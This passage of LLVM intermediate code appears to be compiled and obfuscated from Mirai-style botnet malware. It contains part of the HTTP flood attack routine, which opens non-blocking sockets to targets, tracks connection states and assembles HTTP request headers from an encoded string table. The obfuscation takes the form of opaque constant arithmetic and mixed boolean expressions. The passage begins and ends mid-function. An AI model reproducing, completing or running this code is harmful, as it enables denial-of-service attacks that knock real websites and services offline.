; <label>:345:                                    ; preds = %336, %327, %318, %309, %300, %297
  %346 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %347 = load i32, i32* %9, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %346, i64 %348
  %350 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %349, i32 0, i32 6
  %351 = getelementptr inbounds [257 x i8], [257 x i8]* %350, i32 0, i32 0
  %352 = load i8*, i8** %17, align 8
  %353 = call i32 @util_strcpy(i8* %351, i8* %352)
  br label %354

; <label>:354:                                    ; preds = %345
  %355 = load i32, i32* %9, align 4
  %356 = add i32 %355, 1221237768
  %357 = add i32 %356, 1
  %358 = sub i32 %357, 1221237768
  %359 = add nsw i32 %355, 1
  store i32 %358, i32* %9, align 4
  br label %154

; <label>:360:                                    ; preds = %154
  br label %361

; <label>:361:                                    ; preds = %2802, %1066, %1056, %360
  store i32 0, i32* %23, align 4
  %362 = call i64 @time(i64* null) #6
  %363 = trunc i64 %362 to i32
  store i32 %363, i32* %27, align 4
  br label %364

; <label>:364:                                    ; preds = %361
  %365 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %366 = getelementptr inbounds [16 x i64], [16 x i64]* %365, i64 0, i64 0
  %367 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %366) #6, !srcloc !1
  %368 = extractvalue { i64, i64* } %367, 0
  %369 = extractvalue { i64, i64* } %367, 1
  %370 = trunc i64 %368 to i32
  store i32 %370, i32* %28, align 4
  %371 = ptrtoint i64* %369 to i64
  %372 = trunc i64 %371 to i32
  store i32 %372, i32* %29, align 4
  br label %373

; <label>:373:                                    ; preds = %364
  br label %374

; <label>:374:                                    ; preds = %373
  %375 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %376 = getelementptr inbounds [16 x i64], [16 x i64]* %375, i64 0, i64 0
  %377 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %376) #6, !srcloc !2
  %378 = extractvalue { i64, i64* } %377, 0
  %379 = extractvalue { i64, i64* } %377, 1
  %380 = trunc i64 %378 to i32
  store i32 %380, i32* %30, align 4
  %381 = ptrtoint i64* %379 to i64
  %382 = trunc i64 %381 to i32
  store i32 %382, i32* %31, align 4
  br label %383

; <label>:383:                                    ; preds = %374
  store i32 0, i32* %9, align 4
  br label %384

; <label>:384:                                    ; preds = %1047, %383
  %385 = load i32, i32* %9, align 4
  %386 = load i32, i32* %18, align 4
  %387 = icmp slt i32 %385, %386
  br i1 %387, label %388, label %1053

; <label>:388:                                    ; preds = %384
  %389 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %390 = load i32, i32* %9, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %389, i64 %391
  store %struct.attack_http_state* %392, %struct.attack_http_state** %26, align 8
  %393 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %394 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %393, i32 0, i32 1
  %395 = load i8, i8* %394, align 4
  %396 = zext i8 %395 to i32
  %397 = icmp eq i32 %396, 1
  br i1 %397, label %398, label %410

; <label>:398:                                    ; preds = %388
  %399 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %400 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %399, i32 0, i32 12
  %401 = load i32, i32* %400, align 4
  %402 = icmp ne i32 %401, 0
  br i1 %402, label %403, label %406

; <label>:403:                                    ; preds = %398
  %404 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %405 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %404, i32 0, i32 1
  store i8 4, i8* %405, align 4
  br label %409

; <label>:406:                                    ; preds = %398
  %407 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %408 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %407, i32 0, i32 1
  store i8 0, i8* %408, align 4
  br label %409

; <label>:409:                                    ; preds = %406, %403
  br label %410

; <label>:410:                                    ; preds = %409, %388
  %411 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %412 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %411, i32 0, i32 1
  %413 = load i8, i8* %412, align 4
  %414 = zext i8 %413 to i32
  %415 = icmp eq i32 %414, 0
  br i1 %415, label %416, label %517

; <label>:416:                                    ; preds = %410
  %417 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %417, i8 0, i64 16, i32 4, i1 false)
  %418 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %419 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %418, i32 0, i32 0
  %420 = load i32, i32* %419, align 4
  %421 = icmp ne i32 %420, -1
  br i1 %421, label %422, label %427

; <label>:422:                                    ; preds = %416
  %423 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %423, i32 0, i32 0
  %425 = load i32, i32* %424, align 4
  %426 = call i32 @close(i32 %425)
  br label %427

; <label>:427:                                    ; preds = %422, %416
  %428 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %429 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %430 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %429, i32 0, i32 0
  store i32 %428, i32* %430, align 4
  %431 = icmp eq i32 %428, -1
  br i1 %431, label %432, label %433

; <label>:432:                                    ; preds = %427
  br label %1047

; <label>:433:                                    ; preds = %427
  %434 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %435 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %434, i32 0, i32 0
  %436 = load i32, i32* %435, align 4
  %437 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %438 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %437, i32 0, i32 0
  %439 = load i32, i32* %438, align 4
  %440 = call i32 (i32, i32, ...) @fcntl(i32 %439, i32 3, i32 0)
  %441 = and i32 2048, %440
  %442 = xor i32 2048, %440
  %443 = or i32 %441, %442
  %444 = or i32 2048, %440
  %445 = call i32 (i32, i32, ...) @fcntl(i32 %436, i32 4, i32 %443)
  store i32 65535, i32* %10, align 4
  %446 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %447 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %446, i32 0, i32 0
  %448 = load i32, i32* %447, align 4
  %449 = bitcast i32* %10 to i8*
  %450 = call i32 @setsockopt(i32 %448, i32 0, i32 8, i8* %449, i32 4) #6
  %451 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %451, align 4
  %452 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %453 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %452, i32 0, i32 4
  %454 = load i32, i32* %453, align 4
  %455 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %456 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %455, i32 0, i32 0
  store i32 %454, i32* %456, align 4
  %457 = load i16, i16* %19, align 2
  %458 = call zeroext i16 @htons(i16 zeroext %457) #7
  %459 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %458, i16* %459, align 2
  %460 = load i32, i32* %27, align 4
  %461 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %462 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %461, i32 0, i32 2
  store i32 %460, i32* %462, align 4
  %463 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %464 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %463, i32 0, i32 1
  store i8 2, i8* %464, align 4
  %465 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %466 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %465, i32 0, i32 0
  %467 = load i32, i32* %466, align 4
  %468 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %469 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %469, %struct.sockaddr** %468, align 8
  %470 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %471 = load %struct.sockaddr*, %struct.sockaddr** %470, align 8
  %472 = call i32 @connect(i32 %467, %struct.sockaddr* %471, i32 16)
  %473 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %474 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %473, i32 0, i32 0
  %475 = load i32, i32* %474, align 4
  %476 = srem i32 %475, 64
  %477 = zext i32 %476 to i64
  %478 = shl i64 1, %477
  %479 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %480 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %481 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %480, i32 0, i32 0
  %482 = load i32, i32* %481, align 4
  %483 = sdiv i32 %482, 64
  %484 = sext i32 %483 to i64
  %485 = getelementptr inbounds [16 x i64], [16 x i64]* %479, i64 0, i64 %484
  %486 = load i64, i64* %485, align 8
  %487 = xor i64 %486, -1
  %488 = xor i64 %478, -1
  %489 = xor i64 7031568775076441423, -1
  %490 = and i64 %487, 7031568775076441423
  %491 = and i64 %486, %489
  %492 = and i64 %488, 7031568775076441423
  %493 = and i64 %478, %489
  %494 = or i64 %490, %491
  %495 = or i64 %492, %493
  %496 = xor i64 %494, %495
  %497 = or i64 %487, %488
  %498 = xor i64 %497, -1
  %499 = or i64 7031568775076441423, %489
  %500 = and i64 %498, %499
  %501 = or i64 %496, %500
  %502 = or i64 %486, %478
  store i64 %501, i64* %485, align 8
  %503 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %504 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %503, i32 0, i32 0
  %505 = load i32, i32* %504, align 4
  %506 = load i32, i32* %23, align 4
  %507 = icmp sgt i32 %505, %506
  br i1 %507, label %508, label %516

; <label>:508:                                    ; preds = %433
  %509 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %510 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %509, i32 0, i32 0
  %511 = load i32, i32* %510, align 4
  %512 = add i32 %511, -2047276995
  %513 = add i32 %512, 1
  %514 = sub i32 %513, -2047276995
  %515 = add nsw i32 %511, 1
  store i32 %514, i32* %23, align 4
  br label %516

; <label>:516:                                    ; preds = %508, %433
  br label %1046

; <label>:517:                                    ; preds = %410
  %518 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %519 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %518, i32 0, i32 1
  %520 = load i8, i8* %519, align 4
  %521 = zext i8 %520 to i32
  %522 = icmp eq i32 %521, 2
  br i1 %522, label %523, label %575

; <label>:523:                                    ; preds = %517
  %524 = load i32, i32* %27, align 4
  %525 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %526 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %525, i32 0, i32 2
  %527 = load i32, i32* %526, align 4
  %528 = sub i32 %524, -779789189
  %529 = sub i32 %528, %527
  %530 = add i32 %529, -779789189
  %531 = sub i32 %524, %527
  %532 = icmp ugt i32 %530, 30
  br i1 %532, label %533, label %542

; <label>:533:                                    ; preds = %523
  %534 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %535 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %534, i32 0, i32 1
  store i8 0, i8* %535, align 4
  %536 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %537 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %536, i32 0, i32 0
  %538 = load i32, i32* %537, align 4
  %539 = call i32 @close(i32 %538)
  %540 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %541 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %540, i32 0, i32 0
  store i32 -1, i32* %541, align 4
  br label %1047

; <label>:542:                                    ; preds = %523
  %543 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %544 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %543, i32 0, i32 0
  %545 = load i32, i32* %544, align 4
  %546 = srem i32 %545, 64
  %547 = zext i32 %546 to i64
  %548 = shl i64 1, %547
  %549 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %550 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %551 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %550, i32 0, i32 0
  %552 = load i32, i32* %551, align 4
  %553 = sdiv i32 %552, 64
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds [16 x i64], [16 x i64]* %549, i64 0, i64 %554
  %556 = load i64, i64* %555, align 8
  %557 = and i64 %556, %548
  %558 = xor i64 %556, %548
  %559 = or i64 %557, %558
  %560 = or i64 %556, %548
  store i64 %559, i64* %555, align 8
  %561 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %562 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %561, i32 0, i32 0
  %563 = load i32, i32* %562, align 4
  %564 = load i32, i32* %23, align 4
  %565 = icmp sgt i32 %563, %564
  br i1 %565, label %566, label %574

; <label>:566:                                    ; preds = %542
  %567 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %568 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %567, i32 0, i32 0
  %569 = load i32, i32* %568, align 4
  %570 = add i32 %569, 132253403
  %571 = add i32 %570, 1
  %572 = sub i32 %571, 132253403
  %573 = add nsw i32 %569, 1
  store i32 %572, i32* %23, align 4
  br label %574

; <label>:574:                                    ; preds = %566, %542
  br label %1045

; <label>:575:                                    ; preds = %517
  %576 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %577 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %576, i32 0, i32 1
  %578 = load i8, i8* %577, align 4
  %579 = zext i8 %578 to i32
  %580 = icmp eq i32 %579, 4
  br i1 %580, label %581, label %876

; <label>:581:                                    ; preds = %575
  %582 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %583 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %582, i32 0, i32 14
  store i32 -1, i32* %583, align 4
  %584 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %585 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %584, i32 0, i32 11
  store i32 0, i32* %585, align 4
  %586 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %587 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %586, i32 0, i32 18
  %588 = getelementptr inbounds [1024 x i8], [1024 x i8]* %587, i32 0, i32 0
  call void @util_zero(i8* %588, i32 1024)
  %589 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %590 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %589, i32 0, i32 17
  store i32 0, i32* %590, align 4
  %591 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %591, i32 10240)
  %592 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %593 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %594 = call i32 @util_strlen(i8* %593)
  %595 = sext i32 %594 to i64
  %596 = getelementptr inbounds i8, i8* %592, i64 %595
  %597 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %598 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %597, i32 0, i32 9
  %599 = getelementptr inbounds [9 x i8], [9 x i8]* %598, i32 0, i32 0
  %600 = call i32 @util_strcpy(i8* %596, i8* %599)
  %601 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %602 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %603 = call i32 @util_strlen(i8* %602)
  %604 = sext i32 %603 to i64
  %605 = getelementptr inbounds i8, i8* %601, i64 %604
  %606 = call i32 @util_strcpy(i8* %605, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %607 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %608 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %609 = call i32 @util_strlen(i8* %608)
  %610 = sext i32 %609 to i64
  %611 = getelementptr inbounds i8, i8* %607, i64 %610
  %612 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %613 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %612, i32 0, i32 6
  %614 = getelementptr inbounds [257 x i8], [257 x i8]* %613, i32 0, i32 0
  %615 = call i32 @util_strcpy(i8* %611, i8* %614)
  %616 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %617 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %618 = call i32 @util_strlen(i8* %617)
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds i8, i8* %616, i64 %619
  %621 = call i32 @util_strcpy(i8* %620, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %622 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %623 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %624 = call i32 @util_strlen(i8* %623)
  %625 = sext i32 %624 to i64
  %626 = getelementptr inbounds i8, i8* %622, i64 %625
  %627 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %628 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %627, i32 0, i32 5
  %629 = getelementptr inbounds [512 x i8], [512 x i8]* %628, i32 0, i32 0
  %630 = call i32 @util_strcpy(i8* %626, i8* %629)
  %631 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %632 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %633 = call i32 @util_strlen(i8* %632)
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds i8, i8* %631, i64 %634
  %636 = call i32 @util_strcpy(i8* %635, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %637 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %638 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %639 = call i32 @util_strlen(i8* %638)
  %640 = sext i32 %639 to i64
  %641 = getelementptr inbounds i8, i8* %637, i64 %640
  %642 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %643 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %642, i32 0, i32 7
  %644 = getelementptr inbounds [129 x i8], [129 x i8]* %643, i32 0, i32 0
  %645 = call i32 @util_strcpy(i8* %641, i8* %644)
  %646 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %647 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %648 = call i32 @util_strlen(i8* %647)
  %649 = sext i32 %648 to i64
  %650 = getelementptr inbounds i8, i8* %646, i64 %649
  %651 = call i32 @util_strcpy(i8* %650, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 48)
  %652 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %653 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %654 = call i32 @util_strlen(i8* %653)
  %655 = sext i32 %654 to i64
  %656 = getelementptr inbounds i8, i8* %652, i64 %655
  %657 = call i8* @table_retrieve_val(i32 48, i32* null)
  %658 = call i32 @util_strcpy(i8* %656, i8* %657)
  call void @table_lock_val(i8 zeroext 48)
  %659 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %660 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %661 = call i32 @util_strlen(i8* %660)
  %662 = sext i32 %661 to i64
  %663 = getelementptr inbounds i8, i8* %659, i64 %662
  %664 = call i32 @util_strcpy(i8* %663, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 49)
  %665 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %666 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %667 = call i32 @util_strlen(i8* %666)
  %668 = sext i32 %667 to i64
  %669 = getelementptr inbounds i8, i8* %665, i64 %668
  %670 = call i8* @table_retrieve_val(i32 49, i32* null)
  %671 = call i32 @util_strcpy(i8* %669, i8* %670)
  call void @table_lock_val(i8 zeroext 49)
  %672 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %673 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %674 = call i32 @util_strlen(i8* %673)
  %675 = sext i32 %674 to i64
  %676 = getelementptr inbounds i8, i8* %672, i64 %675
  %677 = call i32 @util_strcpy(i8* %676, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 50)
  %678 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %679 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %680 = call i32 @util_strlen(i8* %679)
  %681 = sext i32 %680 to i64
  %682 = getelementptr inbounds i8, i8* %678, i64 %681
  %683 = call i8* @table_retrieve_val(i32 50, i32* null)
  %684 = call i32 @util_strcpy(i8* %682, i8* %683)
  call void @table_lock_val(i8 zeroext 50)
  %685 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %686 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %687 = call i32 @util_strlen(i8* %686)
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds i8, i8* %685, i64 %688
  %690 = call i32 @util_strcpy(i8* %689, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %691 = load i8*, i8** %14, align 8
  %692 = icmp ne i8* %691, null
  br i1 %692, label %693, label %734

; <label>:693:                                    ; preds = %581
  call void @table_unlock_val(i8 zeroext 51)
  %694 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %695 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %696 = call i32 @util_strlen(i8* %695)
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds i8, i8* %694, i64 %697
  %699 = call i8* @table_retrieve_val(i32 51, i32* null)
  %700 = call i32 @util_strcpy(i8* %698, i8* %699)
  call void @table_lock_val(i8 zeroext 51)
  %701 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %702 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %703 = call i32 @util_strlen(i8* %702)
  %704 = sext i32 %703 to i64
  %705 = getelementptr inbounds i8, i8* %701, i64 %704
  %706 = call i32 @util_strcpy(i8* %705, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %707 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %708 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %709 = call i32 @util_strlen(i8* %708)
  %710 = sext i32 %709 to i64
  %711 = getelementptr inbounds i8, i8* %707, i64 %710
  %712 = call i8* @table_retrieve_val(i32 56, i32* null)
  %713 = call i32 @util_strcpy(i8* %711, i8* %712)
  %714 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %715 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %716 = call i32 @util_strlen(i8* %715)
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds i8, i8* %714, i64 %717
  %719 = call i32 @util_strcpy(i8* %718, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %720 = load i8*, i8** %14, align 8
  %721 = call i32 @util_strlen(i8* %720)
  %722 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %723 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %724 = call i32 @util_strlen(i8* %723)
  %725 = sext i32 %724 to i64
  %726 = getelementptr inbounds i8, i8* %722, i64 %725
  %727 = call i8* @util_itoa(i32 %721, i32 10, i8* %726)
  %728 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %729 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %730 = call i32 @util_strlen(i8* %729)
  %731 = sext i32 %730 to i64
  %732 = getelementptr inbounds i8, i8* %728, i64 %731
  %733 = call i32 @util_strcpy(i8* %732, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %734

; <label>:734:                                    ; preds = %693, %581
  %735 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %736 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %735, i32 0, i32 15
  %737 = load i32, i32* %736, align 4
  %738 = icmp sgt i32 %737, 0
  br i1 %738, label %739, label %783

; <label>:739:                                    ; preds = %734
  %740 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %741 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %742 = call i32 @util_strlen(i8* %741)
  %743 = sext i32 %742 to i64
  %744 = getelementptr inbounds i8, i8* %740, i64 %743
  %745 = call i32 @util_strcpy(i8* %744, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  br label %746

; <label>:746:                                    ; preds = %771, %739
  %747 = load i32, i32* %10, align 4
  %748 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %749 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %748, i32 0, i32 15
  %750 = load i32, i32* %749, align 4
  %751 = icmp slt i32 %747, %750
  br i1 %751, label %752, label %776

; <label>:752:                                    ; preds = %746
  %753 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %754 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %755 = call i32 @util_strlen(i8* %754)
  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds i8, i8* %753, i64 %756
  %758 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %759 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %758, i32 0, i32 16
  %760 = load i32, i32* %10, align 4
  %761 = sext i32 %760 to i64
  %762 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %759, i64 0, i64 %761
  %763 = getelementptr inbounds [128 x i8], [128 x i8]* %762, i32 0, i32 0
  %764 = call i32 @util_strcpy(i8* %757, i8* %763)
  %765 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %766 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %767 = call i32 @util_strlen(i8* %766)
  %768 = sext i32 %767 to i64
  %769 = getelementptr inbounds i8, i8* %765, i64 %768
  %770 = call i32 @util_strcpy(i8* %769, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  br label %771

; <label>:771:                                    ; preds = %752
  %772 = load i32, i32* %10, align 4
  %773 = sub i32 0, 1
  %774 = sub i32 %772, %773
  %775 = add nsw i32 %772, 1
  store i32 %774, i32* %10, align 4
  br label %746

; <label>:776:                                    ; preds = %746
  %777 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %778 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %779 = call i32 @util_strlen(i8* %778)
  %780 = sext i32 %779 to i64
  %781 = getelementptr inbounds i8, i8* %777, i64 %780
  %782 = call i32 @util_strcpy(i8* %781, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %783

; <label>:783:                                    ; preds = %776, %734
  %784 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %785 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %786 = call i32 @util_strlen(i8* %785)
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds i8, i8* %784, i64 %787
  %789 = call i32 @util_strcpy(i8* %788, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %790 = load i8*, i8** %14, align 8
  %791 = icmp ne i8* %790, null
  br i1 %791, label %792, label %800

; <label>:792:                                    ; preds = %783
